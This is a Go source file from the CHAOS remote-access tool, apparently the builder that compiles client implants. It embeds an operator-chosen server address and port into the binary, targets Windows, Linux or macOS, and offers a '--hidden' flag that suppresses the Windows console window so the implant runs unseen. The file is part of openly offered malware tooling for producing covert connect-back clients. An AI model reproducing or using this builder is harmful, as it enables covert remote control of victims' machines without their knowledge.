package generate

import (
	"fmt"
	"github.com/google/uuid"
	"github.com/jedib0t/go-pretty/table"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/pkg/color"
	"github.com/tiagorlampert/CHAOS/pkg/system"
	"github.com/tiagorlampert/CHAOS/pkg/util"
	"os"
	"os/exec"
	"strings"
)

type GenerateUseCase struct{}

type Target struct {
	Address  string
	Port     string
	Filename string
	OS       string
	Hidden   bool
}

func NewGenerateUseCase() usecase.Build {
	return &GenerateUseCase{}
}

func (g GenerateUseCase) BuildClientBinary(params []string) error {
	buildTarget := buildTargetParams(params)

	if err := validateParams(params, buildTarget); err != nil {
		return nil
	}

	correct := handleTargetConfirmation(buildTarget)
	if !correct {
		return nil
	}

	util.CreateDirectory(util.BuildDirectory)

	fmt.Println("")
	fmt.Println(color.Green, "[*] Compiling...")

	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -tags netgo -ldflags '%s -s -w -X main.ServerPort=%s -X main.ServerAddress=%s -extldflags "-static"' -o ../%s/%s main.go`
	cmd := exec.Command("sh", "-c", fmt.Sprintf(buildStr, buildTarget.OS, runHidden(buildTarget.Hidden), buildTarget.Port, buildTarget.Address, util.BuildDirectory, buildTarget.Filename))
	cmd.Dir = "client/"
	err := cmd.Run()
	if err != nil {
		return err
	}

	fmt.Println(color.Green, fmt.Sprint("[*] Generated at build/", buildTarget.Filename))
	return nil
}

func buildTargetParams(params []string) *Target {
	address := util.SplitAfterIndex(util.Find(params, "address="), '=')
	port := util.SplitAfterIndex(util.Find(params, "port="), '=')
	filename := util.SplitAfterIndex(util.Find(params, "filename="), '=')
	osTarget := util.SplitAfterIndex(strings.ReplaceAll(util.Find(params, "--"), "--", "="), '=')
	hidden := util.Find(params, "--hidden")

	if strings.TrimSpace(filename) == "" {
		filename = uuid.New().String()
	}

	return &Target{
		Address:  address,
		Port:     port,
		Filename: handleFilename(osTarget, filename),
		OS:       handleOSType(osTarget),
		Hidden:   handleVisibility(hidden),
	}
}

func handleVisibility(hidden string) bool {
	if strings.TrimSpace(hidden) == "--hidden" {
		return true
	}
	return false
}

func validateParams(params []string, target *Target) error {
	if !util.Contains(params, "address=") {
		fmt.Println(color.Yellow, "[!] You should specify a address!")
		return usecase.ErrRequiredParam
	}
	if !util.Contains(params, "port=") {
		fmt.Println(color.Yellow, "[!] You should specify a port!")
		return usecase.ErrRequiredParam
	}
	if !util.Contains(params, "--windows") && !util.Contains(params, "--linux") && !util.Contains(params, "--macos") {
		fmt.Println(color.Yellow, "[!] You should specify a OS target!")
		return usecase.ErrRequiredParam
	}

	if target.Hidden && (target.OS == "linux" || target.OS == "darwin") {
		fmt.Println(color.Yellow, fmt.Sprintf("[!] Param hidden not supported for %s!", target.OS))
		return usecase.ErrUnsupportedParam
	}
	if target.OS == "darwin" && system.DetectOS() != system.Darwin {
		fmt.Println(color.Yellow, fmt.Sprintf("[!] Generate a binary to %s is only supported on a MacOS!", target.OS))
		return usecase.ErrUnsupportedParam
	}
	return nil
}

func handleOSType(osType string) string {
	switch strings.TrimSpace(osType) {
	case "windows":
		return "windows"
	case "linux":
		return "linux"
	case "macos":
		return "darwin"
	default:
		return "unknown"
	}
}

func runHidden(hidden bool) string {
	if hidden {
		return "-H=windowsgui"
	}
	return ""
}

func handleFilename(osType string, filename string) string {
	switch strings.TrimSpace(osType) {
	case "windows":
		return fmt.Sprint(filename, ".exe")
	default:
		return filename
	}
}

func renderTargetTable(target *Target) {
	t := table.NewWriter()
	t.SetOutputMirror(os.Stdout)
	t.Style().Options.SeparateRows = true
	t.AppendHeader(table.Row{"Address", "Port", "Filename", "OS Target", "Hidden"})
	t.AppendRows([]table.Row{{target.Address, target.Port, target.Filename, target.OS, target.Hidden}})
	t.Render()
}

func handleTargetConfirmation(target *Target) bool {
	fmt.Println("")
	renderTargetTable(target)
	fmt.Println("")
	fmt.Print(color.Cyan, " [?] The information above is correct? (y/n): ")

	var confirmation string
	fmt.Scanln(&confirmation)

	if strings.TrimSpace(strings.ToLower(confirmation)) == "y" {
		return true
	}
	return false
}
